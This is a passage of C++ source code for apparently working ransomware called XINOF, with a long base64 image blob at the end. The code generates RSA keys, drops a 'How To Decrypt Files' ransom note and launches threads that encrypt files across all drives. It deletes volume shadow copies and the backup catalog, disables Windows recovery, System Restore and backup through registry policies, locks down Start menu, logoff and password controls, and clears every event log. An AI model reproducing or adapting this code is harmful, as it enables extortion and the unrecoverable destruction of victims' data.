    if ((!exist(L"C:\\ProgramData\\Cpriv.key") && !exist(L"C:\\ProgramData\\Cpub.key"))) {
        keyGen();
        CopyToPath();
    }

    system("Copy Cpriv.key C:\\ProgramData\\Cpriv.key");
    system("Copy Cpub.key C:\\ProgramData\\Cpub.key");
    wstring idpath = L"C:\\ProgramData";
    idpath = idpath + L"\\SystemID";
    if (!exist(idpath.c_str()))
        GenID();


    CopyToPath();
    register wstring id = L"00000000";

    if (exist(idpath.c_str())) {
        std::wifstream idf(idpath, std::wifstream::binary);
        idf.read(&id[0], 8);
        idf.close();
    }
    else if (exist(L"SystemID")) {
        std::wifstream idf("SystemID", std::wifstream::binary);
        idf.read(&id[0], 8);
        idf.close();
    }
    else {
        id = L"00000000";
    }



    if (!exist(L"C:\\ProgramData\\How To Decrypt Files.hta") && !exist(L"Help.txt")) {
        Readme(&id[0]);
    }
    CopyToPath();
    RSA::PublicKey pb;
    LoadPublicKey("C:\\ProgramData\\Cpub.key", pb);


  
    system("reg add HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\System   /v AllowBlockingAppsAtShutdown  /t REG_DWORD /d 1 /f");
    system("reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer   /v NoClose  /t REG_DWORD /d 1 /f");
    system("reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer   /v StartMenuLogOff  /t REG_DWORD /d 1 /f");

    wstring parts[] = { L"E:",L"F:",L"G:",L"H:",L"I:",L"J:",L"K:",L"L:",L"M:",L"N:",L"A:",L"B:",L"O:",L"P:",L"Q:",L"R:",L"S:",L"T:",L"U:",L"V:",L"W:",L"X:",L"Y:",L"Z:" };

    for (wstring part : parts) {
        if (GetDriveTypeW(part.c_str()) != 5) {
            thread T(FindFiles, part, &id[0], pb);
            T.detach();
            HANDLE hT = T.native_handle();
            SetThreadPriority(hT, THREAD_PRIORITY_HIGHEST);
            SetThreadPriorityBoost(hT, FALSE);
        }
        else continue;
    }
    if (GetDriveTypeW(L"D:") != 5) 
    FindFiles(L"D:", &id[0], pb);
    FindFiles(L"C:", &id[0], pb);



    


        system("start cmd.exe /c vssadmin Delete Shadows /All /Quiet ");
        system("start cmd.exe /c wmic shadowcopy delete ");
        system("start cmd.exe /c bcdedit /set {default} boostatuspolicy ignoreallfailures ");
        system("start cmd.exe /c bcdedit /set {default} recoveryenabled no ");
        system("start cmd.exe /c wbadmin delete catalog -quiet/");
    for (wstring part : parts) {
        wstring comm = L"Label " + part + L" XINOF";
        _wsystem(comm.c_str());
    }
    system("Label C: XINOF ");
    system("Label D: XINOF ");

    system("attrib +h +s XINOF.exe");
    system("attrib +h +s C:\\ProgramData\\XINOF.exe");
    system("attrib +h +s Cpub.key");
    system("attrib +h +s C:\\ProgramData\\Cpub.key");
    system("reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer   /v NoTrayContextMenu  /t REG_DWORD /d 1 /f");
    system("reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer   /v DisableContextMenusInStart  /t REG_DWORD /d 1 /f");
    system("reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer   /v NoSearchFilesInStartMenu  /t REG_DWORD /d 1 /f");
    system("reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer   /v NoSearchProgramsInStartMenu  /t REG_DWORD /d 1 /f");
    system("reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer   /v NoStartMenuMorePrograms  /t REG_DWORD /d 1 /f");
    system("reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer   /v NoSMConfigurePrograms  /t REG_DWORD /d 1 /f");
    system("reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer   /v NoSMMyDocs  /t REG_DWORD /d 1 /f");
    system("reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer   /v NoNetworkConnections  /t REG_DWORD /d 1 /f");
    system("reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer   /v NoSMMyPictures  /t REG_DWORD /d 1 /f");
    system("reg add HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\Explorer   /v TaskbarNoPinnedList  /t REG_DWORD /d 1 /f");
    system("reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer   /v NoStartMenuPinnedList  /t REG_DWORD /d 1 /f");
    system("reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer   /v NoRun  /t REG_DWORD /d 1 /f");
    system("reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer   /v HideSCANetwork  /t REG_DWORD /d 1 /f");
    system("reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer   /v NoUserNameInStartMenu  /t REG_DWORD /d 1 /f");
    system("reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer   /v HideSCAHealth  /t REG_DWORD /d 1 /f");
    // system("reg add HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\RemovableStorageDevices   /v Deny_All  /t REG_DWORD /d 1 /f");
    system("reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System   /v DisableChangePassword  /t REG_DWORD /d 1 /f");
    system("reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System   /v DisableLockWorkstation  /t REG_DWORD /d 1 /f");
    system("reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System   /v NoLogoff  /t REG_DWORD /d 1 /f");
    system("reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System   /v NoDispCPL  /t REG_DWORD /d 1 /f");
    system("reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\NonEnum   /v {645FF040-5081-101B-9F08-00AA002F954E}  /t REG_DWORD /d 1 /f");
    system("reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\AppV\\Client\\Virtualization   /v EnableDynamicVirtualization  /t REG_DWORD /d 0 /f");
    system("reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\WinRE   /v DisableSetup  /t REG_DWORD /d 1 /f");
    system("reg add \"HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows NT\\SystemRestore\"   /v DisableConfig  /t REG_DWORD /d 1 /f");
    system("reg add \"HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows NT\\SystemRestore\"   /v DisableSR  /t REG_DWORD /d 1 /f");
    system("reg add HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\Backup\\Client   /v DisableBackupToDisk  /t REG_DWORD /d 1 /f");
    system("reg add HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\Backup\\Client   /v DisableBackupToNetwork  /t REG_DWORD /d 1 /f");
    system("reg add HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\Backup\\Client   /v DisableBackupToOptical  /t REG_DWORD /d 1 /f");
    system("reg add HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\Backup\\Client   /v DisableBackupLauncher  /t REG_DWORD /d 1 /f");
    system("reg add HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\Backup\\Client   /v DisableRestoreUI  /t REG_DWORD /d 1 /f");
    system("reg add HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\Backup\\Client   /v DisableBackupUI  /t REG_DWORD /d 1 /f");
    system("reg add HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\Backup\\Client   /v DisableSystemBackupUI  /t REG_DWORD /d 1 /f");
    system("reg add HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\Backup\\Server   /v OnlySystemBackup  /t REG_DWORD /d 1 /f");
    system("reg add HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\Backup\\Server   /v NoBackupToDisk  /t REG_DWORD /d 1 /f");
    system("reg add HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\Backup\\Server   /v NoBackupToNetwork  /t REG_DWORD /d 1 /f");
    system("reg add HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\Backup\\Server   /v NoBackupToOptical  /t REG_DWORD /d 1 /f");
    system("reg add HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\Backup\\Server   /v NoRunNowBackup  /t REG_DWORD /d 1 /f");
    system("reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-System\\{9580d7dd-0379-4658-9870-d5be7d52d6de}   /v Enable /t REG_DWORD /d 0 /f");
    system("for /F \"tokens=*\" %s in ('wevtutil.exe el') DO wevtutil.exe cl \"%s\"");

    string text1 = "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dGluUHJvb2YAAAAJcHJvb2ZDTVlLADhCSU0EOwAAAAACLQAAABAAAAABAAAAAAAScHJpbnRPdXRwdXRPcHRpb25zAAAAFwAAAABDcHRuYm9vbAAAAAAAQ2xicmJvb2wAAAAAAFJnc01ib29sAAAAAABDcm5DYm9vbAAAAAAAQ250Q2Jvb2wAAAAAAExibHNib29sAAAAAABOZ3R2Ym9vbAAAAAAARW1sRGJvb2wAAAAAAEludHJib29sAAAAAABCY2tnT2JqYwAAAAEAAAAAAABSR0JDAAAAAwAAAABSZCAgZG91YkBv4AAAAAAAAAAAAEdybiBkb3ViQG/gAAAAAAAAAAAAQmwgIGRvdWJAb+AAAAAAAAAAAABCcmRUVW50RiNSbHQAAAAAAAAAAAAAAABCbGQgVW50RiNSbHQAAAAAAAAAAAAAAABSc2x0VW50RiNQeGxAWQAAAAAAAAAAAAp2ZWN0b3JEYXRhYm9vbAEAAAAAUGdQc2VudW0AAAAAUGdQcwAAAABQZ1BDAAAAAExlZnRVbnRGI1JsdAAAAAAAAAAAAAAAAFRvcCBVbnRGI1JsdAAAAAAAAAAAAAAAAFNjbCBVbnRGI1ByY0BZAAAAAAAAAAAAEGNyb3BXaGVuUHJpbnRpbmdib29sAAAAAA5jcm9wUmVjdEJvdHRvbWxvbmcAAAAAAAAADGNyb3BSZWN0TGVmdGxvbmcAAAAAAAAADWNyb3BSZWN0UmlnaHRsb25nAAAAAAAAAAtjcm9wUmVjdFRvcGxvbmcAAAAAADhCSU0D7QAAAAAAEABkAAAAAQABAGQAAAABAAE4QklNBCYAAAAAAA4AAAAAAAAAAAAAP4AAADhCSU0EDQAAAAAABAAAAB44QklNBBkAAAAAAAQAAAAeOEJJTQPzAAAAAAAJAAAAAAAAAAABADhCSU0nEAAAAAAACgABAAAAAAAAAAE4QklNA/UAAAAAAEgAL2ZmAAEAbGZmAAYAAAAAAAEAL2ZmAAEAoZmaAAYAAAAAAAEAMgAAAAEAWgAAAAYAAAAAAAEANQAAAAEALQAAAAYAAAAAAAE4QklNA/gAAAAAAHAAAP////////////////////////////8D6AAAAAD/////////////////////////////A+gAAAAA/////////////////////////////wPo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b2JlLmNvbS9waG90b3Nob3AvMS4wLyIgeG1sbnM6eG1wTU09Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9tbS8iIHhtbG5zOnN0RXZ0PSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvc1R5cGUvUmVzb3VyY2VFdmVudCMiIHhtbG5zOmRjPSJodHRwOi8vcHVybC5vcmcvZGMvZWxlbWVudHMvMS4xLyIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiBwaG90b3Nob3A6TGVnYWN5SVBUQ0RpZ2VzdD0iQTIzOEI5QzYxMTc4MkU0Q0RDNkZGN0MwMEEyNkQ2QzMiIHBob3Rvc2hvcDpDb2xvck1vZGU9IjMiIHBob3Rvc2hvcDpJQ0NQcm9maWxlPSIiIHhtcE1NOkRvY3VtZW50SUQ9ImFkb2JlOmRvY2lkOnBob3Rvc2hvcDo0NGRkYWQxYi1jNDdkLTExZWEtOTFiZC1jM2RkNzIyZjE0MjYiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6NjMzODVmZmMtMGMyYi1hNTRmLTgyMTQtMzY0YzJjYTI0NTZmIiB4bXBNTTpPcmlnaW5hbERvY3VtZW50SUQ9Ijg4RDU4NUU3QUQ2NDExNTMxN0Y3N0RCOTkyMTdEODNDIiBkYzpmb3JtYXQ9ImltYWdlL2pwZWciIHhtcDpDcmVhdGVEYXRlPSIyMDIwLTA3LTEzVDAwOjI4OjQxKzA0OjMwIiB4bXA6TW9kaWZ5RGF0ZT0iMjAyMC0wNy0xM1QwMDo1MTo0OSswNDozMCIgeG1wOk1ldGFkYXRhRGF0ZT0iMjAyMC0wNy0xM1QwMDo1MTo0OSswNDozMCI+IDxwaG90b3Nob3A6VGV4dExheWVycz4gPHJkZjpCYWc+IDxyZGY6bGkgcGhvdG9zaG9wOkxheWVyTmFtZT0iWElOT0YiIHBob3Rvc2hvcDpMYXllclRleHQ9IlhJTk9GIi8+IDwvcmRmOkJhZz4gPC9waG90b3Nob3A6VGV4dExheWVycz4gPHhtcE1NOkhpc3Rvcnk+IDxyZGY6U2VxPiA8cmRmOmxpIHN0RXZ0OmFjdGlvbj0ic2F2ZWQiIHN0RXZ0Omluc3RhbmNlSUQ9InhtcC5paWQ6ZjVlNzNiNDYtNWZhOS1jZjQ0LTkwNWMtOWYwMjYwNzljNzQ5IiBzdEV2dDp3aGVuPSIyMDIwLTA3LTEzVDAwOjI5OjA2KzA0OjMwIiBzdEV2dDpzb2Z0d2FyZUFnZW50PSJBZG9iZSBQaG90b3Nob3AgQ0MgMjAxNyAoV2luZG93cykiIHN0RXZ0OmNoYW5nZWQ9Ii8iLz4gPHJkZjpsaSBzdEV2dDphY3Rpb249InNhdmVkIiBzdEV2dDppbnN0YW5jZUlEPSJ4bXAuaWlkOjYzMzg1ZmZjLTBjMmItYTU0Zi04MjE0LTM2NGMyY2EyNDU2ZiIgc3RFdnQ6d2hlbj0iMjAyMC0wNy0xM1QwMDo1MTo0OSswNDozMCIgc3RFdnQ6c29mdHdhcmVBZ2VudD0iQWRvYmUgUGhvdG9zaG9wIENDIDIwMTcgKFdpbmRvd3MpIiBzdEV2dDpjaGFuZ2VkPSIvIi8+IDwvcmRmOlNlcT4gPC94bXBNTTpIaXN0b3J5PiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA